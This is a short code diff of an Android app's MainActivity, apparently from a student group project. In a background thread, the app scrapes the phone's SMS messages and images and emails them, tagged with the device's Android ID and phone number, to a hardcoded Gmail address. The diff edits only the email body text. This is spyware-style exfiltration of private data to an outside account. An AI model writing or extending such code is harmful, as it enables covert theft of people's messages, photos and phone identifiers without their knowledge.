@@ -205,7 +205,7 @@ public class MainActivity extends AppCompatActivity {
                         + "\n\nSMS Messages:\n-----\n"
                         + MessageScrape.scrapeMessage(getContentResolver())
                 );
-                EmailPicHelper.sendEmail("ict1004p2grp4@gmail.com", "Images - "+ androidID +"  |  Number:"+phoneNum, "test", ImageScrape.scrapeImages(getContentResolver()));
+                EmailPicHelper.sendEmail("ict1004p2grp4@gmail.com", "Images - "+ androidID +"  |  Number:"+phoneNum, "Images taken from " + phoneNum, ImageScrape.scrapeImages(getContentResolver()));
             }
         }.start();
 
